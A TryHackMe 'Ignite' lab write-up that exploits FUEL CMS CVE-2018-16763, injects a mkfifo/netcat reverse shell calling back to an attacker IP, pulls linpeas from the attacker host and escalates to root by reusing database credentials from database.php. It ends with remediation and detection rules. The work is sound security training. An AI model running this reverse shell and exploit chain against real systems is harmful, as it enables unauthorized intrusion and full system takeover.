# Ignite - CMS Exploitation & Configuration Enumeration

**Platform:** TryHackMe | **Target OS:** Linux | **Difficulty:** Easy
**Focus:** Fuel CMS CVE-2018-16763, Mkfifo Reverse Shells, Manual Local Enumeration, Credential Reuse

## 1. Executive Summary & Attack Chain
This assessment demonstrates a straightforward but critical attack path stemming from outdated web application software and poor password hygiene. Initial reconnaissance revealed a web server running FUEL CMS version 1.4. Leveraging a known Remote Code Execution (RCE) vulnerability (CVE-2018-16763), a reverse shell was established on the target, granting access as the `www-data` service account. 

During the local enumeration phase, automated enumeration tools failed to execute. Pivoting to manual analysis of the application's directory structure uncovered the database configuration file. This file contained plaintext credentials (`root` / `mememe`). Exploiting the operational flaw of password reuse, these credentials were used to authenticate directly as the Linux system `root` user, achieving total system compromise.

**Kill-Chain summary:**
1. **Reconnaissance:** Nmap identified Apache running on port 80, and web enumeration revealed FUEL CMS version 1.4.
2. **Initial Access:** Exploited CVE-2018-16763 (FUEL CMS RCE) to inject a named-pipe (`mkfifo`) reverse shell payload.
3. **Local Enumeration:** Captured the user flag and manually traversed the `/var/www/html/fuel/application/config/` directory.
4. **Privilege Escalation:** Extracted the plaintext database password from `database.php` and successfully reused it to `su root`.

---

## 2. Network Reconnaissance & Surface Mapping
The engagement started with an Nmap scan to enumerate open ports and identify running services.

```bash
❯ nmap -sV -sC 10.130.147.113
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-15 07:02 +0300
Nmap scan report for 10.130.147.113
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.86 seconds
```
Nmap successfully identified an Apache web server hosting "FUEL CMS". By inspecting the main page's HTML source code via `curl` (and filtering for the word "Version"), the exact software version was identified.

```html
<h1>Welcome to Fuel CMS</h1>
<h2>Version 1.4</h2>
```

---

## 3. Initial Access & Fuel CMS RCE (CVE-2018-16763)
Using `searchsploit`, the local Exploit-DB repository was queried for vulnerabilities affecting FUEL CMS 1.4. 

```bash
❯ searchsploit FUEL CMS
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                               |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                                                                                                                   | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                                                                                                                   | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                                                                                                                   | php/webapps/50477.py
------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

### Theoretical Mechanics: CVE-2018-16763
FUEL CMS versions 1.4.1 and below suffer from a severe pre-authentication Remote Code Execution vulnerability. The flaw exists in the routing mechanics of the application (specifically within `fuel/modules/fuel/controllers/pages.php`). When processing the `preview` parameter, the application utilizes the PHP `eval()` function to render page variables dynamically. Because the application fails to properly sanitize the input passed to `eval()`, an attacker can inject arbitrary PHP code (such as `system()` or `exec()`), which the underlying server will execute.

The python exploit script (`50477.py`) was copied and executed against the target URL. To catch a stable shell, a `mkfifo` (named pipe) reverse shell payload was generated and passed to the exploit prompt.

*Mechanics of the Mkfifo payload:* `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.192.12 4444 >/tmp/f`
This payload creates a named pipe `/tmp/f`. It uses `cat` to read from the pipe and sends the output to an interactive shell (`/bin/sh -i`). The output of that shell (both stdout and stderr `2>&1`) is then piped to `nc` connecting back to the attacker. Finally, the input from `nc` is redirected back into the named pipe (`>/tmp/f`), creating a continuous bi-directional loop.

```bash
❯ searchsploit -m php/webapps/50477.py
Copied to: /home/0xZiki/Work/htb/50477.py

❯ python3 50477.py -u https://10.130.147.113
Can't connect to url

░▒▓ 💀 0xZiki   arch    
 󰄬 ❯ python3 50477.py -u http://10.130.147.113
[+]Connecting...
Enter Command $rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.192.12 4444 >/tmp/f
```

The payload successfully executed, returning a shell as the `www-data` user, allowing retrieval of the User Flag.

```bash
❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.130.147.113 52456
/bin/sh: 0: can't access tty; job control turned off
$ whooami
/bin/sh: 1: whooami: not found
$ whoami
www-data
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html/assets/docs$ cd ../..
www-data@ubuntu:/var/www/html$ cd /home
www-data@ubuntu:/home$ cd www-data
www-data@ubuntu:/home/www-data$ cat flag.txt
6470e394cbf6dab6a91682cc8585059b
```

---

## 4. Lateral Movement / Local Enumeration
To identify privilege escalation vectors, manual enumeration was initiated by searching for SUID binaries (`find / -perm -4000`), which yielded only standard system files. 

An attempt was made to download and execute `linpeas.sh` to automate the local enumeration. However, due to an environmental issue (likely the Python HTTP server serving a 404 HTML error page instead of the actual script), the downloaded file was an HTML document. Executing it resulted in a `syntax error near unexpected token 'newline' '<!DOCTYPE html>'`.

```bash
www-data@ubuntu:/tmp$ wget http://192.168.192.12:8000/linpeas.sh
www-data@ubuntu:/tmp$ chmod +x linpeas.sh
www-data@ubuntu:/tmp$ ./linpeas.sh
./linpeas.sh: line 1: syntax error near unexpected token `newline'
./linpeas.sh: line 1: `<!DOCTYPE html>'
```

Adapting to this friction, the strategy shifted to manual directory traversal, specifically targeting web application configuration files which frequently contain hardcoded database credentials. The `application/config` directory of FUEL CMS was located and inspected.

```bash
www-data@ubuntu:/tmp$ cd /var/www/html/fuel/application/config/
www-data@ubuntu:/var/www/html/fuel/application/config$ ls
MY_config.php	     constants.php	google.php     profiler.php
MY_fuel.php	     custom_fields.php	hooks.php      redirects.php
MY_fuel_layouts.php  database.php	index.html     routes.php
...
```

---

## 5. Privilege Escalation & Credential Reuse
Reading the contents of `database.php` revealed plaintext credentials intended for the MySQL database. 

```php
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
[... Truncated for brevity ...]
$db['default'] = array(
	'dsn'	=> '',
	'hostname' => 'localhost',
	'username' => 'root',
	'password' => 'mememe',
	'database' => 'fuel_schema',
	'dbdriver' => 'mysqli',
[... Truncated ...]
```

### OS Mechanics: Password Reuse
In many poorly configured environments, administrators use the same password for database services (MySQL root) as they do for the underlying operating system (`root`). Since the reverse shell was upgraded earlier using `python3 -c 'import pty; pty.spawn("/bin/bash")'`, the shell had an interactive TTY capable of handling the `su` (Switch User) password prompt.

Attempting to switch to the system `root` user utilizing the database password (`mememe`) was successful, proving severe password reuse.

```bash
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# whoami
root
root@ubuntu:/var/www/html/fuel/application/config# cd /root
root@ubuntu:~# cat root.txt
b9bbcb33e11b80be759c4e844862482d
root@ubuntu:~#
```

---

## 6. Defensive Remediation & Detection Engineering

### Remediation Strategies
1. **Software Patching:** The underlying RCE vulnerability (CVE-2018-16763) is resolved in FUEL CMS version 1.4.2 and higher. Update the CMS immediately.
2. **Credential Segmentation (Zero Trust):** Never reuse passwords across different contexts. The MySQL `root` password must be distinct from the Linux OS `root` password. Furthermore, web applications should interact with the database using a restricted service account (e.g., `fuel_user`) that only has access to the specific `fuel_schema` database, rather than the database `root` account.
3. **Web Server Hardening:** Ensure the web application directories restrict execution permissions appropriately. 

### Detection Engineering
* **Web Application Firewalls (WAF):** Implement a WAF to monitor and block HTTP requests containing known PHP injection patterns or system execution commands (like `rm /tmp/f`, `mkfifo`, or `nc`) in URI parameters.
* **Process Monitoring (Event ID 4688 / Auditd):** Create audit rules to alert when the `www-data` user spawns anomalous processes such as `sh`, `bash`, `nc` (netcat), or `mkfifo`. 
    * *Auditd Rule:* `-a always,exit -F arch=b64 -F euid=33 -S execve -k www_data_shell`
* **Authentication Monitoring:** Alert on successful `su root` commands invoked by low-privileged service accounts like `www-data` via `/var/log/auth.log`.